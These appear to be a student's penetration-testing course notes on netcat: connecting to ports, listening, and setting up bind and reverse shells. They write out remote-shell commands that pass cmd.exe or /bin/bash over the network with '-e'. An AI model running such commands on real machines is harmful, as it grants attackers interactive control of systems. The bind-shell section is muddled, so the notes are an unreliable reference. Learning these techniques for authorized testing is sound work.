NETCAT

    What is it? - To establish connections on open ports and create listening ports on local machine

WHY? - Exploit development - Neccessary to determine HOW TO CONNECT TO A MACHINE ONCE AN EXPLOIT IS SENT AND WHAT TYPE OF SHELL IS GOING TO BE USED. PRIMARILY NETCAT FOR THIS COURSE TO CONNECT TO A MACHINE AND HAVE IT CONNECT TO US.

Connecting vs LISTENING

To attempt to establish a connection with TCP port:

    nc -nv [destination ip] [destination port]

To listen on TCP port:

    nc -nvlp 4444

Bind Shell: Attacker connects to a victim on listening PORTS###

    1. On Windows Machine - set netcat to listen on 4444/tcp:
          
    Once Netcat is running 'Cmd line:' prompt will appear; we will pass it the command line executable.
        
        Cmd line: -nvlp 4444 -e cmd.exe
    
    2. On Linux Machine - set netcat to connect to 4444/tcp:
    
    nc -nv 192.168.2.1 4444 -e /bin/bash 

Reverse Shell: Victim connects to attacker on listening PORTS### (Mainly used)

    1. On Linux Machine - set netcat to listen on 4444/tcp:
    
    nc -nvlp 4444

    2. On Windows Machine - connect to 2.130 machine on 4444/tcp:
    
    C:\nc64.exe
        
        Once Netcat is running 'Cmd line:' prompt will appear; we will 'pass the destination host'? the command line executable (-e)
    
        Once Netcat is running 'Cmd line:' prompt will appear; we will pass it the command line executable.
        
        Cmd line: -nv 192.168.2.130 4444 -e cmd.exe
